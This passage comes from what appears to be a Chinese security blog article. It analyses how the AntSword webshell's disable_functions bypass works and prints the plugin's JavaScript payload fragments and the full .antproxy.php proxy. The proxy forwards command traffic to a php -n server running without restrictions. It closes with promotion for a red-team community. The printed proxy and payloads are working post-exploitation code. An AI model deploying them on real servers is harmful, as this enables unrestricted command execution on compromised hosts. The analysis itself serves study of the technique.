            'CONTENT_LENGTH' => strlen($content)
            ),
            $content
          );
          sleep(1);
          echo(1);
        `;
        core.request({
          _: payload,
        }).then((response) => {

        }).catch((err) => {
          // 超时也是正常
        })
      }).then(() => {
        // 验证是否成功开启
        var payload = `sleep(1);
          $fp = @fsockopen("127.0.0.1", ${port}, $errno, $errstr, 1);
          if(!$fp){
            echo(0);
          }else{
            echo(1);
            @fclose($fp);
          };`
        core.request({
          _: payload,
        }).then((response) => {
          // ... [代码省略] ...
        }).catch((err) => {
          // ... [代码省略] ...
        })
      }).catch((err) => {
        // ... [代码省略] ...
      });
    // ... [代码省略] ...
}
```  
  
  
js文件分析到此结束  
  
  
最后来看一下生成的  
.antproxy.php内容如下  
  
```
<?php
function get_client_header(){
    $headers=array();
    foreach($_SERVER as $k=>$v){
        if(strpos($k,'HTTP_')===0){
            $k=strtolower(preg_replace('/^HTTP/', '', $k));
            $k=preg_replace_callback('/_\w/','header_callback',$k);
            $k=preg_replace('/^_/','',$k);
            $k=str_replace('_','-',$k);
            if($k=='Host') continue;
            $headers[]="$k:$v";
        }
    }
    return $headers;
}
function header_callback($str){
    return strtoupper($str[0]);
}
function parseHeader($sResponse){
    list($headerstr,$sResponse)=explode("",$sResponse, 2);
    $ret=array($headerstr,$sResponse);
    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
        $ret=parseHeader($sResponse);
    }
    return $ret;
}

set_time_limit(120);
$headers=get_client_header();
$host = "127.0.0.1";
$port = 60298;
$errno = '';
$errstr = '';
$timeout = 30;
$url = "/1.php";

if (!empty($_SERVER['QUERY_STRING'])){
    $url .= "?".$_SERVER['QUERY_STRING'];
};

$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
if(!$fp){
    return false;
}

$method = "GET";
$post_data = "";
if($_SERVER['REQUEST_METHOD']=='POST') {
    $method = "POST";
    $post_data = file_get_contents('php://input');
}

$out = $method." ".$url." HTTP/1.1\r\n";
$out .= "Host: ".$host.":".$port."\r\n";
if (!empty($_SERVER['CONTENT_TYPE'])) {
    $out .= "Content-Type: ".$_SERVER['CONTENT_TYPE']."\r\n";
}
$out .= "Content-length:".strlen($post_data)."\r\n";

$out .= implode("\r\n",$headers);
$out .= "\r\n\r\n";
$out .= "".$post_data;

fputs($fp, $out);

$response = '';
while($row=fread($fp, 4096)){
    $response .= $row;
}
fclose($fp);
$pos = strpos($response, "\r\n\r\n");
$response = substr($response, $pos+4);
echo $response;
```  
  
  
这段php代码  
实现了一个HTTP 代理功能，就是把我们的流量转发到  
60298端口(端口随机生成)，让我们看看  
60298端口是个啥--  
运行了一个php server  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95Kero3rdXXmce23BiaSXXEMSXxAmUDHLvR7qyT13O2RFf791EscuaqCto8Q/640?wx_fmt=png "")  
  
pid为69186  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerD7ZmzrUrg2Gxvm7z8lQsWqTsiaW1rJgC6Hd4rEzq2VhKyNbpXDVicvHw/640?wx_fmt=png "")  
  
解读一下返回结果  
  
```
/bin/sh -c php -n -S 127.0.0.1:60298-t /var/www/html
```  
  
  
-n  
：让 PHP 忽略加载 php.ini  
 配置文件。这意味着 PHP 将运行在一个没有任何预设配置的“裸”环境中。也就是没有disable functions的环境。  
  
到这里，一切都明朗的很，最终结果就是--执行命令的流量通过.  
antproxy.php转发到这个新的无disable的server上，**就达到了bypass。**  
  
# 技术交流  
  
  
### 知识星球  
  
  
**欢迎加入知识星球****，星球致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。针对网络安全成员的普遍水平，为星友提供了教程、工具、POC&EXP以及各种学习笔记等等。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmXPg6kVsggaWKZsh0ab2kh6icbbkBgOH8icuV0x2IPGGRMiaU2hNBErstcA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmX8Pjria4EK9ib8PPUAxiaMaSqUZibdxNoqqmmVHqGwXkYdzziaZNDLOwCGQw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKubkRgdNbBQdOZibtbt7oibUpdUIl55vlmiaibqInxXG1Z9tfo52jF8onER5R4U2mCM5RpZia6rwEHnlMAg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYItiapGtLIq3gAQYGfE5nictnkFeBicm7brKdibz4Va1hRf2dKZT0IyRRXYboE1lbZ6ZquDGnzqKibGGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmXp9icV9yPQic4EnrpFeIcHB5eBy1GQaoSxbzevjM5QyGl4UFGibuEfwkLQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
### 交流群  
  
  
关注公众号回复“**加群**”，添加Z2OBot好友，自动拉你加入**Z2O安全攻防交流群(微信群)**分享更多好东西。**（QQ群可直接扫码添加）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
### 关注我们  
  
  
  
**关注福利：**  
  
**回复“**  
**app****" 获取  app渗透和app抓包教程**  
  
**回复“**  
**渗透字典****" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**  
  
**回复“**  
**书籍****" 获取 网络安全相关经典书籍电子版pdf**  
  
**回复“资料" 获取 网络安全、渗透测试相关资料文档**  
  
****  
点个【 在看 】，你最好看  
  
  
